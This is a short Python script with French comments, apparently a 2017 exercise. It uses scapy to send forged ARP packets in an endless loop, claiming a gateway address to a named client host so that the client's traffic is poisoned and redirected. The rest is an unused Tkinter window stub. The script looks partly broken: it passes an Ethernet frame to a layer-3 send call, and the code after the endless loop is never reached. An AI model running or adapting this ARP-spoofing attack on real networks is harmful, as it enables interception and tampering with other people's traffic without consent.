#######################################################
#title - scapy                                        #
#date - 05/09/2017                                    #
#######################################################

################# importation fonction externe ########

from scapy.all import *
from Tkinter import *

################# fonction ############################

class Interface(Frame):
      
    def __init__(self, fenetre, **kwargs):
        Frame.__init__(self, fenetre, width=350, height=250, **kwargs)
        self.pack(fill=BOTH)
        self.nb_clic = 0


mac = "00:0c:29:80:39:ae"
client = "10.94.73.3"
getway = "10.94.73.254"

send( Ether(dst=mac)/ARP(op="who-has", psrc=getway, pdst=client),
      inter=RandNum(10,40), loop=1 )


fenetre = Tk()
interface = Interface(fenetre)

interface.mainloop()
interface.destroy()